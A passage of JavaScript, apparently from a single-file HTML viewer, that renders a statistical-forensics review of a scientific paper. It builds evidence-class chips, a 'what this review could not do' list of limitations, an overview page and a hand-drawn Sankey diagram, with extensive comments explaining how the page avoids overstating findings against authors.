  return m?`<div class="alarm"><b>This bundle could not open the paper it
    describes.</b> ${esc(m)}</div>`:'';
}
function wireTables(root){
  root.querySelectorAll('table[data-sortable]').forEach(t=>{
    t.querySelectorAll('th').forEach(th=>{
      th.onclick=()=>{
        const i=+th.dataset.col, body=t.tBodies[0];
        const dir = th.classList.contains('asc') ? -1 : 1;
        t.querySelectorAll('th').forEach(o=>o.classList.remove('asc','desc'));
        th.classList.add(dir===1?'asc':'desc');
        const rows=[...body.rows];
        const num = s => { const m=String(s).replace(/[, ]/g,'').match(/-?\d+\.?\d*/); return m?parseFloat(m[0]):null; };
        rows.sort((a,b)=>{
          const x=a.cells[i].innerText.trim(), y=b.cells[i].innerText.trim();
          const nx=num(x), ny=num(y);
          if(nx!==null&&ny!==null&&x.length<18&&y.length<18) return (nx-ny)*dir;
          return x.localeCompare(y)*dir;
        });
        rows.forEach(r=>body.appendChild(r));
      };
    });
  });
  root.querySelectorAll('input[data-for]').forEach(inp=>{
    inp.oninput=()=>{
      const t=root.querySelector('#'+inp.dataset.for); if(!t) return;
      const q=inp.value.toLowerCase();
      [...t.tBodies[0].rows].forEach(r=>{
        r.style.display = !q || r.innerText.toLowerCase().includes(q) ? '' : 'none';
      });
    };
  });
}

/* Most-severe-first, from `tools/severity.py`. Not written out again here --
   the ladder already exists in five places and a sixth copy would be one more
   thing to forget to update. */
const SEVERITY_ORDER=__SEVERITY_LEVELS__;

/* WHAT KIND OF CLAIM IS THIS? -- the integrity card, by tool name.

   The most consequential word in this document is 'impossible', and nothing in
   the viewer said what class of claim it belongs to. A GRIM sweep reaching
   'impossible' is exact arithmetic over printed digits; an effect-size
   plausibility check reaching 'suspicious' is a judgement against benchmarks
   that are themselves publication-biased. Those two sentences deserve
   different credence and the page rendered them identically.

   The cards are built in Python from registry.TOOL_INTEGRITY -- see
   `_tool_cards` -- so the class, the ceiling and the assumptions here are the
   same objects the tools themselves declare and cannot drift from them. */
const TOOLCARD={}; ((D.tool_cards||{}).cards||[]).forEach(c=>{TOOLCARD[c.tool]=c;});
/* A finding's `technique` names a FAMILY -- "grim", "duplication" -- and the
   card is filed under the tool -- `grim_percentage`, `detect_duplication`.
   Resolved in Python against the mapping severity_reconcile already owns. */
const TOOLALIAS=(D.tool_cards||{}).aliases||{};
const cardFor=n=>TOOLCARD[n]||TOOLCARD[TOOLALIAS[n]]||null;

/* The chip that appears beside a check name. The two RESTRAINING classes carry
   their restraint in the chip itself -- a probabilistic check saying 'never
   impossible' is the fact a reader most needs and must not have to click for.
   The strengthening class is a bare classification whose preconditions are one
   click away, because writing 'proves it' beside a severity word would be the
   overstatement this whole document exists to avoid. */
const EV_CHIP={
  absolute:'exact arithmetic',
  probabilistic:'probabilistic, never impossible',
  descriptive:'descriptive, renders no verdict',
};
function evChip(name, severity){
  /* `manual` is the weakest class in the document and had no chip at all,
     because it names no tool to carry one. It is exactly the case a reader
     must not have to infer: the number was read off the paper by the model and
     no validated check touched it. */
  if(name==='manual') return ' <span class="def" title="'+
    esc('Read off the paper by the model, NOT computed by a validated tool. '+
        'The weakest evidence class in this document.')+
    '" data-cb="cb-severity">not computed by a tool</span>';
  const c=cardFor(name); if(!c||!c.evidence) return '';
  const ceiling=c.severity_ceiling
    ? ' Strongest verdict it may reach: '+String(c.severity_ceiling).replace(/_/g,' ')+'.'
    : '';
  const chip=' <span class="def" title="'+esc((c.evidence_meaning||'')+ceiling)+
    '" data-cb="cb-tool-'+esc(c.tool)+'">'+esc(EV_CHIP[c.evidence]||c.evidence)+'</span>';
  /* A FINDING MORE SEVERE THAN THE CHECK BEHIND IT CAN RETURN. Rare and real:
     measured over every archived run, 2 of 294 stamped findings record a
     severity above their tool's declared ceiling, both `multiplicity_report`
     -- a descriptive tool that renders no verdict -- carried at `suspicious`.
     The severity in those cases came from the write-up, not from the check,
     and saying so is the whole purpose of stamping a class at all. Disclosed
     rather than suppressed: hiding the chip here would remove the reader's
     only cue in exactly the case where they most need one. */
  const ci=SEVERITY_ORDER.indexOf(c.severity_ceiling), si=SEVERITY_ORDER.indexOf(severity);
  if(ci>=0 && si>=0 && si<ci) return chip+' <span class="conseq unexplained">('+
    'recorded above what this check can return -- the severity is the write-up\'s, '+
    'not the tool\'s)</span>';
  return chip;
}
/* Which checks an editorial finding rests on, and what each may conclude. The
   editorial stage writes no `technique` of its own, so without this the
   headline cards -- the ones a reader actually reads -- carried a severity
   word and no evidence class at all, while the nested tool verdicts beneath
   them carried both. */
function evRests(backing){
  const names=[...new Set((backing||[]).map(f=>
    (f.inputs&&f.inputs.tool)||f.technique).filter(n=>n&&(n==='manual'||cardFor(n))))];
  if(!names.length) return '';
  return '<p class="conseq"><b>Rests on:</b> '+names.map(n=>
    '<code>'+esc(n)+'</code>'+evChip(n,(backing.find(f=>
      ((f.inputs&&f.inputs.tool)||f.technique)===n)||{}).severity)).join('; ')+'</p>';
}

const S=[];

/* WHAT THIS REVIEW COULD NOT DO -- printed beside the verdict, not filed away
   from it.

   THE CARDINAL RULE, MADE STRUCTURAL. Every restraining fact this run recorded
   was written down, was true, and sat on a DIFFERENT PAGE from the verdict:
   what the checks refused on Coverage, the sandbox verdict on Audit, the
   figure blindness in one row of a metadata table, the reproduction commands
   that do not run on Run details, this pipeline's own precision on How to read
   this. A reader who stops at the Overview -- which is most readers who are
   not auditing one number -- met a coded verdict and a tally of `impossible`
   with nothing beside them. Of all the arrangements of these same facts, that
   is the one that makes a finding look more damning than the evidence
   supports.

   EVERY LINE IS COMPUTED FROM THE PAYLOAD THE DETAILED PAGE READS, and links
   to it, so this summary cannot drift from the thing it summarises.

   A line that does not apply is OMITTED, never printed as a reassuring zero.
   "0 findings without tool backing" invites the reader to score the run out of
   ten; the purpose here is disclosure, not a scorecard. */
function limitsHtml(){
  /* TWO LISTS, AND THE SPLIT IS THE POINT.
     Wording changes have twice failed to stop this section reading as "the
     pipeline had a list of tasks and abandoned it". The reason is structural:
     a limit that BOUNDS what else could be in the paper sits in the same
     bullet list as one that BEARS on a finding printed above it, so a reader
     cannot tell which items weaken what they just read.

     `L` bears on the findings; `B` bounds the unexplored remainder. Scope is
     assigned HERE, at each push, because that is the only place that knows --
     and AMBIGUITY DEFAULTS TO `L`, the reading against ourselves. */
  const L=[], B=[];
  const rep=D.report_obj||{}, cs=rep.coverage_summary||D.coverage_summary||{}, rm=D.run_meta||{};
  const practice=n=>(D.practice||[]).find(p=>p.practice===n)||{};
  const jump=(id,t)=>'<a href="#'+id+'">'+t+'</a>';

  /* THE TEXT'S OWN INTEGRITY, FIRST, and in `L` because it bears on every
     finding above rather than bounding what else might be there.

     `agent.py` has been computing this into `coverage_summary.text_integrity`
     and NO PAGE READ IT. A paper whose font encoding corrupts digits reached a
     reader with no sign of it -- and the corruption is not hypothetical:
     `P < 0\x0605` was reaching checks as a p of ZERO, and `the effect was /C0
     0.85 (95% CI /C0 1.2, /C0 0.3)` as a POSITIVE 0.85. A detector nobody
     renders is the same as no detector.

     Digit corruption is stated separately from the rest, because a lost minus
     sign is a different fact from a mangled apostrophe. */
  const ti=cs.text_integrity||{};
  if(ti.error){
    L.push('The text-integrity scan did not run (<code>'+esc(String(ti.error))
      +'</code>), so nothing here has checked whether this PDF\'s font encoding '
      +'corrupted its numbers.');
  } else if(ti.quarantine){
    const dig=(ti.patterns||[]).filter(p=>p.corrupts_digits);
    L.push('<b>This paper\'s extracted text is character-corrupt in a way that '
      +'affects DIGITS.</b> '
      +dig.map(p=>esc(p.pattern)+' ('+p.count+')').join(', ')
      +'. A broken font encoding can drop a minus sign or split a decimal, so a '
      +'number reaching a check may not be the number the paper printed, and '
      +'every finding above should be read against the PDF itself.');
  } else if((ti.patterns||[]).length){
    B.push('The extracted text carries character damage that does not touch '
      +'digits ('+(ti.patterns||[]).map(p=>esc(p.pattern)).join(', ')
      +'), which can hide a statistic from the enumerator without altering one.');
  }

  /* HOW MUCH OF THE PAPER WAS EVEN LOOKED AT. `stats_found` was on the
     Coverage page and `stats_checked` was on no page at all, so a paper where
     122 of 741 located statistics were checked advertised the 741. That is the
     most inflating number in the document and it was the only one shown. */
  if(typeof cs.stats_checked==='number' && typeof cs.stats_found==='number'
     && cs.stats_found>0){
    B.push('<b>'+cs.stats_checked+' of '+cs.stats_found+'</b> statistics located in '
      +'the paper were actually checked'
      +(cs.stats_checked<cs.stats_found
        ? '. The remainder were not examined, and nothing here is evidence about them'
        : '')+'. '+jump('coverage','Coverage and limits'));
  }
  const ck=cs.checkable||{};
  if(typeof ck.n_consumable==='number' && ck.n_consumable>0){
    /* THE CAVEAT TRAVELS WITH THE NUMBER.
       This counts cells routed through `check_table` ONLY. The Coverage page
       says so in as many words -- "a review that called a check directly on
       each cell scores 0 here, so this UNDERSTATES what was done rather than
       flattering it" -- and that sentence stayed on the Coverage page while the
       bare number appeared here, on the landing screen, directly beneath the
       verdict. "0 of 525" under a condemning verdict (then `untrustworthy`, replaced on
     2026-08-11) reads as "we checked nothing":
       incoherent to a naive reader and indefensible to a hostile one.

       Knowingly wrong in our own DISFAVOUR is not a virtue, it is just wrong.
       A shortfall list that overstates the shortfall fails the same way as one
       that hides it -- the reader cannot tell which parts to believe. */
    B.push('<b>'+(ck.cells_checked_via_check_table||0)+' of '+ck.n_consumable+'</b> '
      +'table cells were checked through the BATCH path'
      +(ck.blocked_on_declaration
        ? ', with '+ck.blocked_on_declaration+' waiting on a variable declaration '
          +'nobody supplied' : '')
      +'. This counts only cells routed through <code>check_table</code>; a check '
      +'called directly on a cell scores nothing here, so the figure UNDERSTATES '
      +'what was done rather than flattering it. '
      +jump('coverage','Coverage and limits'));
  }

  /* Both stages record refusals and they record DIFFERENT ones. Counting the
     larger list here rather than the one the page happened to render. */
  const nUnchecked=Math.max((D.unchecked||[]).length,(rep.not_checked||[]).length);
  if(nUnchecked) B.push('<b>'+nUnchecked+'</b> place'+(nUnchecked===1?'':'s')+' in '
    +'the paper were examined and then REFUSED, each for a stated reason. '
    +jump('coverage','see what and why'));

  /* `unknown` counts here as well as `no`. The practice table distinguishes
     them correctly -- `unknown` means the extraction never got far enough to
     look, and calling that `no` would charge the paper for our blind spot --
     but for THIS list the two collapse: either way no figure was read, and the
     reader's exposure is identical. The row's own detail supplies the reason. */
  const fig=practice('Figures available to the checks');
  if(fig.status==='no'||fig.status==='unknown')
    L.push('<b>No figure was read as an image.</b> Anything reported only in a plot '
      +'was invisible to every check. '+jump('figures','Figures'));

  if(String(practice('Supplementary material supplied to this review').status||'')==='no'){
    const r=D.supplement_retrieval||{};
    L.push('<b>The cited supplementary material was not in front of this review.</b> '
      +(r.sentence?esc(r.sentence)+' ':'')
      +'A statistic living only in a supplement we do not hold is indistinguishable '
      +'here from one the authors never reported.');
  }

  /* The editorial stage can write a finding no validated tool stands behind.
     That is the likeliest route to a false accusation in the whole system --
     the claim was asserted rather than computed -- and it was stated only
     inside the individual cards, where a reader meets it after they have
     already read the accusation.

     THIS PREDICATE WAS THE WRONG ONE, and `evidence_grade`'s own docstring
     already said so: "A design review proposed flagging report findings with no
     `stage1_finding_ids`; measured on the run that motivated it, that predicate
     fires on 0 of 8." This line was the surviving instance of that mistake.
     MEASURED across all 23 unique archived runs: it counted 17 of 222 findings
     (8%) where the ledger's chain predicate catches 88 (40%), so the overview
     understated the phenomenon FIVE-FOLD in every bundle shipped to date.

     The real structure is a CHAIN -- report finding -> sweep findings -> the
     technique behind each. A finding whose backing sweep findings are all
     `technique: manual` DOES cite evidence; the evidence is the model's own
     arithmetic. Read from `D.facts.evidence`, computed once in Python, rather
     than recomputed here: the same rule that fixed the refusal classifier. */
  /* THE DENOMINATOR MUST COME FROM THE SAME BLOCK AS THE NUMERATOR.
     It read `rep.findings.length`, and `rep` is the v1 `report_obj` that the
     parallel path never writes -- so the live banner said
     "18 of 0 findings in this report rest on no validated computation",
     on every panel, because it is a persistent header. The numerator had been
     migrated to `D.facts.evidence`; the denominator was left behind.

     The right number was already sitting beside it: the evidence block carries
     `n` (the population it counted over) next to `counts`. Measured on
     10.1002--jfa2.70171: n=24, counts {computed 6, hand_computed 0,
     reading 18} -- so the sentence should read "18 of 24".

     GUARDED, because a ratio against an absent denominator is worse than no
     sentence: with no usable `n` we state the count alone and do not invent a
     population to divide by. */
  const evd=(D.facts||{}).evidence||{};
  const evc=evd.counts||null;
  const notComputed=evc?((evc.hand_computed||0)+(evc.reading||0)):null;
  const evN=(typeof evd.n==='number'&&evd.n>0)?evd.n:null;
  if(notComputed) L.push('<b>'+notComputed+(evN?' of '+evN:'')+'</b> findings in this '
    +'report '+(notComputed===1?'rests':'rest')+' on no validated computation: the '
    +'claim was ASSERTED, or hand-worked by the model, rather than produced by a '
    +'check this toolkit can reproduce. '
    +jump('findings','each such card says which'));
  /* NO FALLBACK TO THE OLD PREDICATE. I wrote one, then could not write a test
     that reached it: `collect` computes the facts block on every build, and the
     payload and this script ship in the same file, so `evc` is never null in a
     bundle that exists. Shipping an unreachable branch that reprints the
     five-fold understatement is the "built, tested, never consumed" pattern
     with a wrong answer inside it. Silence is the safe reading of missing
     facts. */

  /* THE RUN'S OWN VERDICT, QUOTED, rather than a second count of the same
     thing. The sandbox counts findings that NAME a check which never ran; the
     line above counts findings that CITE no sweep finding. The two predicates
     are close enough that two independently computed tallies read as a
     contradiction when they differ, and on the jpm11060545 run they differ (1
     against 2). Quoting the recorded string cannot contradict the file it came
     from. */
  const sa=D.sandbox_audit||{};
  if(sa.n_severe_total) L.push('<b>SEVERE SANDBOX BREACH.</b> '+sa.n_severe_total
    +' call(s) computed a statistic outside the validated tools. '+jump('audit','Audit'));
  else if(/^BREACH/i.test(String(sa.verdict||''))) L.push('The run recorded a '
    +'sandbox verdict of <b>'+esc(sa.verdict)+'</b>. '+jump('audit','Audit'));
  else if(sa.n_unvalidated_total) L.push('<b>'+sa.n_unvalidated_total+'</b> call(s) '
    +'ran outside the declared tool surface, though none computed a statistic. '
    +jump('audit','Audit'));
  /* OFF-LIST HAS TO REACH THE READER, and for one turn it did not. The tier was
     added so a run could stop printing "clean" beside an allowlist its calls
     were not on -- and then every branch above missed it: `n_severe_total` and
     `n_unvalidated_total` are 0 by design for this tier (the arithmetic IS
     ours, so nothing is unvalidated), and the verdict string starts `OFF-LIST:`
     rather than `BREACH`, so the regex above skipped it too. The JSON became
     honest and the landing screen said exactly as little as before. Caught by
     building a real bundle rather than by reading the diff. */
  else if(sa.n_off_allowlist_total) L.push('<b>'+sa.n_off_allowlist_total+'</b> '
    +'call(s) used a forensic tool the stage did not declare. The arithmetic is '
    +'still ours and still tested, so no finding is in doubt -- but the '
    +'allowlist recorded for that stage is not what ran. '+jump('audit','Audit'));

  /* How much of the evidence traces back to the page of the paper.
     COMPUTED IN PYTHON (`viewer_facts.traceability`), not here, and read from
     `D.facts` so the Overview, the Findings page and the Chain of reasoning
     cannot answer the same question with three different numbers again.

     THE OLD SENTENCE WAS FALSE AS WRITTEN, and it was the most-repeated
     self-criticism in the document: it reported the NARROW join
     (`source.source_quote`, 4 of 20 on the archived cerebrolysin run) under the
     BROAD description "cannot trace back to a passage of the paper", when 20 of
     20 findings quote a passage and 17 were located verbatim in the paper. It
     told a cold reader that three quarters of our numbers were untraceable.
     The replacement states what IS traceable first and still states the narrow
     failure -- correcting an over-claim must not become an under-claim. */
  const tsent=(D.facts||{}).traceability_sentence;
  if(tsent) L.push(esc(tsent)+' '+jump('findings','Findings'));

  const nDefault=Object.values(D.guard_audit||{})
    .reduce((n,a)=>n+((a.defaulted_calls||[]).length),0);
  if(nDefault) L.push('<b>'+nDefault+'</b> call(s) let a precondition default rather '
    +'than being told it. A wrong guard does not make a check vaguer, it INVERTS it. '
    +jump('audit','which calls, and what each guard decides'));

  const rp=rm.reproducibility||{};
  /* Same denominator as `reproTally`. It read `n_findings`, which counted the
     headline too, so this line put "13 of 25" over a report with 24 findings. */
  const rpN=(typeof rp.n_targets==='number') ? rp.n_targets : (rp.n_findings||'?');
  if(rp.n_invalid) B.push('<b>'+rp.n_invalid+' of '+rpN+'</b> '
    +'reproduction commands do not run as printed, so a reader cannot re-run those '
    +'findings from the string we gave them. This says nothing about whether the '
    +'findings are right. '+jump('run','Run details'));

  const diverged=(rm.severity_reconciliation||{}).n_diverged;
  if(diverged) L.push('<b>'+diverged+'</b> finding'+(diverged===1?'':'s')+' record a '
    +'severity DIFFERENT from the one the tool returned -- the write-up escalated or '
    +'softened a verdict the check had already reached. '+jump('run','which, and in which direction'));

  const ul=a=>'<ul class="limits">'+a.map(x=>'<li>'+x+'</li>').join('')+'</ul>';
  return '<h3>What this review could not do</h3>'
    +(L.length
      ? '<p class="muted"><b>Bears on the findings above.</b> Each of these '
        +'touches something this review actually reported, so it changes how '
        +'much a specific finding can mean.</p>'+ul(L)
      : '<p class="muted"><b>Nothing here weakens a specific finding above.</b></p>')
    +(B.length
      ? '<p class="muted"><b>Bounds what else could be here.</b> Nothing in this '
        +'list weakens a finding above; each bounds how much of the paper the '
        +'review saw, which is a different question and a smaller one.</p>'+ul(B)
      : '')
    +'<p class="muted">Standing, on every run: an inconsistency has many ordinary '
    +'causes and the innocent ones are far commoner than the guilty. Nearly all of this '
    +'pipeline\'s failure lives in getting numbers off a PDF, not in the arithmetic -- '
    +'the arithmetic is exact and the extraction is not. Any single flag here is '
    +'more likely to be our '
    +'misreading than the authors\' error. <a href="#about">How to read this</a>.</p>';
}

S.push({id:'overview', label:'Overview', build(){
  const m=D.paper_metadata||{}, rm=D.run_meta||{}, ed=(rm.stages||{}).editorial||{};
  const c={}; (D.findings||[]).forEach(f=>c[f.severity]=(c[f.severity]||0)+1);
  /* The two universes a count can come from, computed once: the sweep emits
     one verdict per check (passes included); the report keeps only the
     findings the editorial stage built on them. */
  const edN=((D.report_obj||{}).findings||[]).length;
  const cited=new Set();
  ((D.report_obj||{}).findings||[]).forEach(e=>(e.stage1_finding_ids||[]).forEach(i=>cited.add(String(i))));
  const kept=(D.findings||[]).filter(f=>cited.has(String(f.id))).length;
  /* One row per name in the fixed schema, in the order the payload gives them.
     Nothing is added or dropped per paper: two papers must produce the same
     table so they can be read side by side. */
  const cell=f=>{
    let v = f.fact==='DOI' && f.value && f.value.indexOf('10.')===0
      ? `<a href="https://doi.org/${encodeURI(f.value)}">${esc(f.value)}</a>`
      : esc(f.value);
    if(f.value==='' || f.value==='not recorded' || f.value==='not mentioned in paper')
      v = `<span class="muted">${esc(f.value)}</span>`;
    /* THE ABSTRACT IS THE PAPER'S MARKETING COPY and it is the largest single
       block on this page -- 2,400 characters on the cerebrolysin paper. Moving
       the metadata table below the verdict half-fixed that; collapsing the one
       field responsible finishes it. Available in one click, not occupying a
       third of the landing page of a document about that paper's arithmetic. */
    if(f.fact==='Abstract' && f.value && f.value.length>240)
      v = `<details><summary class="muted">${f.value.length} characters &mdash;
             the paper's own summary, unedited</summary>
             <div class="abstract">${esc(f.value)}</div></details>`;
    return v + (f.detail?` <span class="muted">-- ${esc(f.detail)}</span>`:'');
  };

  /* THE REVIEW'S CONCLUSION COMES FIRST, THE PAPER'S BIBLIOGRAPHY SECOND.
     MEASURED on the jpm11060545 bundle at 1280x900: the entire first screen of
     the whole document was publisher metadata, and the abstract alone pushed
     the verdict a screen and a half down. The first thing a reader met on
     opening a forensic review was the paper's own marketing copy.

     The headline STATEMENT is printed here too. `report.headline` has always
     carried one plain sentence saying what the review found, and the Overview
     showed only the coded verdict word -- then `questionable`, since replaced
     on 2026-08-11 by `unresolved` -- a three-valued label with no direction,
     standing in for a sentence that already existed. */
  const hl=(D.report_obj||{}).headline||{};
  return `<h2>Overview</h2>
    ${/* WHAT PAPER IS THIS. Moving the metadata table below the verdict fixed a
          real problem -- the abstract used to push the conclusion a screen and a
          half down -- but it took the paper's IDENTITY with the marketing copy,
          and Greg is right that those are not the same thing. A reader opening
          a forensic review must know on sight which paper it is about; the tab
          title is not a document. Identity here, in four lines; the full table
          and the abstract stay where they are. */''}
    ${identityHead()}
    ${unreachable()}
    ${(D.supplements||{}).missing?`<div class="note">${
      esc(D.override_warning||'').replace(/\*\*(.+?)\*\*/g,'<b>$1</b>').replace(/\n\n/g,'</p><p>')}</div>`:''}
    ${/* BEFORE YOU READ -- three lines, hard-capped, ABOVE the Result.
          "How to read this" is item 12 of 12. It holds the base rate, the
          meaning of every coded word, and the one instruction that matters --
          and nobody reads item 12 first. The reader who most needs it is the
          one who opened this cold and will stop after the verdict.

          THE CAP IS THE DESIGN. The problem this page already fixed once was a
          conclusion pushed below the fold by material that came first; an
          uncapped preamble would re-create it with better intentions. Three
          lines, then the verdict, still on screen one. */''}
    <div class="beforeread">
      <b>Before you read.</b> Statistical inconsistencies are common in
      papers with nothing wrong with them, so a flag here is a question, not an
      accusation, and <i>indeterminate</i> means this toolkit declined to guess
      rather than that anything is hidden. Check anything that matters by hand,
      then ask the authors -- public allegations are not an appropriate use of
      this output. <a href="#about">Start here</a> for what each word means.
    </div>
    <h3>Result</h3>
    ${/* TWO SCALES, AND THEY WERE PRINTED SIDE BY SIDE UNLABELLED. `Result`
          led with `highly suspicious` and the table beneath said
          `questionable` -- the verdict word replaced on 2026-08-11 by
          `unresolved` -- and they read as two grades of one thing that
          disagree. They grade different objects on different scales: the
          verdict is about WHAT THE CHECKS FOUND across the paper and has three
          values; a severity is about ONE FINDING and has five. Each now says
          which. */''}
    ${hl.statement?`<p class="headline"><span class="scale">Most severe finding</span>
      ${sev(hl.severity)} &mdash; ${esc(hl.statement)}</p>
      ${/* The headline's own evidence string was reachable in no document at
            all -- not the viewer, not report.md. It is the passage the one
            sentence above rests on, so a reader who wants to check the
            sentence should not have to guess which finding it became.
            Collapsed: available, not shouted. */''}
      ${hl.evidence?`<details><summary class="muted">the evidence for that
        sentence${hl.rests_on?', which rests on '+esc(String(hl.rests_on).replace(/_/g,' ')):''}</summary>
        <blockquote>${esc(hl.evidence)}</blockquote></details>`:''}`:''}
    ${/* THREE counts used to share the one word "findings": this table said
          21 (sweep tool verdicts) while the nav badge said 13 (the report)
          and Run details printed the sweep count again under "result" --
          three unlabelled quantities reading as one contradictory number.
          Each count now names its universe. */''}
    ${kv([
      ['verdict on this run', verdictHtml(ed.verdict)
        +(hl.severity?` <span class="muted">-- the whole run, not the finding above
          (<a href="#about">the two scales</a>)</span>
          ${/* NINETY WORDS TO DEFINE ONE, and every clause had been added for a
                reason: what the word means, that it is not misconduct, that it
                is a different scale from a finding severity, how many values
                each scale has, and that one `+'`suspicious`'+` finding need not
                stop the numbers reconciling. All true, and together they buried
                the answer the row exists to give. The verdict now gets one
                line; the reasoning is one click away, in the codebook that was
                already linked from three places on this page. */''}
          <details style="margin-top:4px"><summary class="muted">why this is not
            the same as the severity above</summary>
            <span class="muted">A verdict grades WHAT THE CHECKS FOUND across
            the whole paper and has three values; a severity grades ONE FINDING
            and has five. So a single ${sev(hl.severity)} finding need not stop
            the numbers reconciling -- `+'`suspicious`'+` is a question, not a
            determination.</span></details>`:'')],
      ['confidence', ed.confidence?esc(ed.confidence)+' <span class="muted">-- grades the strength of the review evidence, not the paper</span>':'-'],
    ].concat(edN?[
      ['findings in the report', String(edN)+' <span class="muted">-- conclusions the review wrote; what the Findings page and its count in the contents show</span>'],
    ]:[]).concat([
      ['sweep findings the review recorded', String((D.findings||[]).length)+' <span class="muted">-- one per finding the sweep wrote down'+(edN?'; the report carried '+kept+' of them':'')+'</span>'],
      ['tool calls', String((D.calls||[]).length)+' <span class="muted">-- both stages, file reads included; see Chain of reasoning</span>'],
    ]).concat(
      /* TWO UNIVERSES, EACH UNDER ITS OWN NAME. This block printed the WRITE-UP
         severities under the heading "sweep tool verdicts -- one per check that
         returned a verdict, passes included", which is the OTHER universe.
         Measured on the archived cerebrolysin run: the write-up recorded
         HS 4 / S 12 / indeterminate 4 = 20, while the checks returned
         HS 8 / S 11 / CONSISTENT 2 / indeterminate 3 = 24 -- and the table
         further down this same page said so.

         The dropped category is the one that matters. `consistent` is the only
         verdict that is good news for the authors, and a summary that silently
         omits it is biased in the accusing direction, which is the direction
         this whole toolkit exists to avoid. Both rows are derived in Python
         from the check table itself (`viewer_facts.severity_ledger`), so the
         summary cannot disagree with the table it summarises. */
      (function(){
        const F=(D.facts||{}).severity||{};
        const rows=[];
        const push=(u,head)=>{
          const cs=(u&&u.counts)||{};
          SEVERITY_ORDER.filter(s=>cs[s]).forEach(s=>
            rows.push([head+' at '+sev(s), String(cs[s])]));
        };
        push(F.write_up, 'the write-up recorded');
        push(F.tool, 'the checks returned');
        return rows;
      })()))}
    ${limitsHtml()}
    <h3>Metadata</h3>
    ${kv((D.paper_facts||[]).map(f=>[esc(f.fact), cell(f)]))}
    <h3>Research practice</h3>
    <p class="muted">Reported separately from the findings, and stated
      positively where a practice is present. These are pervasive across the
      literature rather than peculiar to this paper, and a paper that
      preregistered or shared its data has done something most have not.
      <i>unknown</i> is not a polite <i>no</i>: it means the extraction cannot
      see far enough to answer.</p>
    ${tbl(['practice','','detail'],(D.practice||[]).map(p=>[
      esc(p.practice),`<span class="mark ${esc(p.status)}">${esc(p.status)}</span>`,
      esc(p.detail)]),{filterFrom:99})}
    <h3>What each check returned</h3>
    <p class="muted">Every validated tool call, the verdicts it produced, and
      how many of those reached the report. A check that ran and found nothing
      is <i>0 findings</i> -- which is a different fact from a check that never
      ran, and not a worse one.</p>
    ${/* TWO severity columns because there are two quantities, and printing
          one of them under an unqualified heading was how a check that ran 43
          times and passed 21 of them came to show a column summing to 4. THE
          TOOL RETURNED names what the validated check computed; IN THE
          WRITE-UP names what the review said about it. They agreeing is the
          ordinary case; them differing is the interesting one, and it was
          visible nowhere. */''}
    ${tbl(['check','calls','the tool returned','findings','in report','in the write-up'],
      (D.check_table||[]).map(r=>[
        esc(r.check), String(r.calls), sevList(r.tool_verdicts),
        String(r.findings), String(r.kept), sevList(r.severities)
      ]),{filterFrom:99})}
    <p class="muted">A tool verdict is what a validated check computed; a
      write-up severity is what the review concluded about it. A
      <span class="sev consistent">consistent</span> in the first column is a
      check that ran and found the paper's arithmetic sound -- it belongs in
      the accounting whether or not it earned a paragraph.</p>
    <p class="muted">The same flow as a diagram: which check produced which
      severity, and which of those the editorial stage kept.</p>
    ${sankey(D.sankey)}
    <h3>How this review was produced</h3>
    ${kv((D.run_facts||[]).map(f=>[esc(f.fact),
      esc(f.value)+(f.detail?` <span class="muted">-- ${esc(f.detail)}</span>`:'')]))}
    ${/* WHICH READER TURNED THE PDF INTO TEXT. Greg, 2026-08-13: "more
          scrutiny to the pdfplumber runs." It changes what an ABSENCE means --
          pdfplumber renders operators as glyph references and the debris
          filter strips them, so `t(28) = -3.33` arrives as `t(28)3.33`. On one
          paper statcheck found 0 statistics that way and 26 through docling.
          A quiet result from a pdfplumber read may be a quiet EXTRACTOR. */''}
    ${(()=>{const dl=(rm.delivery)||{};
      /* WHAT THE MODEL ASKED FOR AND DID NOT GET. `result_truncated` was
         computed into the ledger for months and rendered by nothing. An
         extraction that overflowed and was never recovered means that file is
         ABSENT from this review -- so every coverage figure below counts items
         the model could not have seen, and a starved run reads as an incurious
         one. */
      if(!dl || dl.ok || !dl.n_undelivered) return '';
      /* NAMING THE FILE, from `lost[].file` rather than `lost[].input`: the
         path in `input` is cut at 120 characters and every path in this corpus
         is longer, so the archived rows end mid-filename ("10.1073--pnas.08012").
         A table that says something was lost and not WHAT is a table a reader
         cannot act on. Which files are affected as a whole is the Coverage
         page's "Files this review could not load"; this stays call-by-call. */
      const rows=(dl.lost||[]).map(x=>[esc(x.file||'-'), esc(x.tool||'?'),
        esc(x.kind||''), esc((x.detail||'').slice(0,90))]);
      return `<h4>Information that did not arrive</h4>
        <div class="note bad">${esc(dl.note||'')}</div>
        <table class="kv"><tr><th>file</th><th>tool</th><th>how</th><th>detail</th></tr>
        ${rows.map(r=>`<tr><td>${r[0]}</td><td>${r[1]}</td><td>${r[2]}</td><td class="muted">${r[3]}</td></tr>`).join('')}
        </table>`;})()}
    ${(()=>{const tp=(rm.text_provenance)||{};
      if(!tp.by_file) return '';
      const rows=Object.entries(tp.by_file).map(([n,v])=>[esc(n),
        v.extractor==='docling'
          ? `<span class="ok">docling</span> <span class="muted">-- operators and signs preserved</span>`
          : `<strong class="bad">pdfplumber</strong> <span class="muted">-- ${esc(v.why||'higher-fidelity read not run')}</span>`]);
      return `<h4>How each file was read</h4>
        ${tp.all_high_fidelity?'':`<div class="note">${esc(tp.note)}</div>`}
        ${kv(rows)}
        <p class="muted">Reader: ${esc(tp.docling_version||'unknown')}. A
          <code>pdfplumber</code> row means the text this review worked from
          may be missing comparators and minus signs, so read an ABSENCE of
          findings in that file with more suspicion than a positive one.</p>`;
    })()}
    <h3>Files</h3>
    ${fileTree(D.files||[])}`;
}});

/* Which check produced which verdict, as a flow. Hand-drawn SVG rather than a
   charting library: the CSP blocks every CDN and a Sankey with two columns is
   a few dozen lines of arithmetic. Ribbons are cubic beziers between the two
   stacks; each stack is laid out by cumulative height so the ribbon widths sum
   to the node heights exactly. */
function sankey(d){
  const nodes=(d||{}).nodes||[], links=(d||{}).links||[];
  if(!links.length) return '<p class="muted">Nothing recorded.</p>';
  /* LBL is the label gutter on each side. 140 clipped the longest tool names
     -- `check_effect_plausibility` and `check_proportion_from_normal` came out
     as `ck_effect_plausibility` and `portion_from_normal`. HEAD is headroom for
     the middle columns' labels, which sit ABOVE their bar and were cut off by
     the top edge of the viewBox. */
  const W=880, PAD=4, NW=13, LBL=200, HEAD=16;
  const cols=[...new Set(nodes.map(n=>n.column))].sort((a,b)=>a-b);
  /* A middle column labels each node ABOVE its bar, so the gap between bars
     has to hold a line of text. With the endpoint-only gap of 3 the label sat
     on the bar above it -- black text on a dark severity fill. */
  const GAP=cols.length>2?15:3;
